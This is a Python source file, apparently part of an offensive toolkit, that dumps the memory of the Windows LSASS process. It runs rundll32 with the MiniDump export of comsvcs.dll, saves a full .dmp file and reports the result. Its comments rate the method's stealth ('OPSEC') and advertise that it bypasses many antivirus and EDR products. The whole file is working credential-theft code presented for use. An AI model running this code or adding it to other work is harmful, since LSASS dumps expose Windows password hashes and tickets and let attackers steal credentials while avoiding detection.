#!/usr/bin/env python3
"""
LSASS dumping via comsvcs.dll (Native Windows DLL)
Most stealthy method - uses legitimate Windows component
"""

import subprocess
from pathlib import Path
from datetime import datetime
from typing import Optional, Dict

from ..utils import get_lsass_pid


class ComsvcsDumper:
    """
    Dump LSASS using comsvcs.dll MiniDump function
    
    OPSEC Level: HIGH
    - Uses native Windows DLL
    - No external tools required
    - Bypasses many AV/EDR solutions
    - Leverages legitimate Windows debugging functionality
    """
    
    METHOD_NAME = "comsvcs"
    OPSEC_RATING = "High"
    
    def __init__(self, output_dir: Path):
        self.output_dir = Path(output_dir)
        self.comsvcs_path = r"C:\Windows\System32\comsvcs.dll"
    
    def dump(self) -> Optional[Dict]:
        """
        Execute LSASS dump via comsvcs.dll
        
        Returns:
            Dict with dump metadata or None on failure
        """
        print(f"\n[*] Method: comsvcs.dll (Native Windows DLL)")
        print(f"[*] OPSEC: {self.OPSEC_RATING} - Uses legitimate Windows component")
        
        # Get LSASS PID
        pid = get_lsass_pid()
        if not pid:
            return None
        
        # Create output file
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        dump_file = self.output_dir / f"lsass_comsvcs_{timestamp}.dmp"
        
        # Build command
        # rundll32.exe calls the MiniDump export from comsvcs.dll
        cmd = f'rundll32.exe {self.comsvcs_path}, MiniDump {pid} {dump_file} full'
        
        print(f"[*] Dumping LSASS (PID {pid})...")
        print(f"[*] Command: {cmd}")
        
        try:
            # Execute dump
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                timeout=30
            )
            
            # Verify dump was created
            if dump_file.exists():
                size = dump_file.stat().st_size
                
                print(f"[+] LSASS dumped successfully!")
                print(f"[+] Dump file: {dump_file}")
                print(f"[+] Size: {size / 1024 / 1024:.2f} MB")
                
                return {
                    'method': self.METHOD_NAME,
                    'file': str(dump_file),
                    'size': size,
                    'timestamp': timestamp,
                    'opsec_rating': self.OPSEC_RATING
                }
            else:
                print(f"[-] Dump file not created")
                print(f"[-] Return code: {result.returncode}")
                
                if result.stderr:
                    print(f"[-] Error: {result.stderr.decode('utf-8', errors='ignore')}")
                
                return None
        
        except subprocess.TimeoutExpired:
            print(f"[-] Dump operation timed out")
            return None
        
        except Exception as e:
            print(f"[-] Dump failed: {e}")
            return None
    
    def is_available(self) -> bool:
        """Check if this method is available"""
        return Path(self.comsvcs_path).exists()
    
    @staticmethod
    def get_info() -> Dict:
        """Get information about this dump method"""
        return {
            'name': 'comsvcs',
            'description': 'Native Windows DLL dumping via rundll32',
            'opsec_rating': 'High',
            'requirements': ['Administrative privileges', 'comsvcs.dll (built-in)'],
            'advantages': [
                'No external tools needed',
                'Uses signed Microsoft DLL',
                'Bypasses many AV/EDR solutions',
                'Living-off-the-land technique'
            ],
            'disadvantages': [
                'Still generates minidump file',
                'May trigger memory access alerts',
                'Requires admin privileges'
            ]
        }
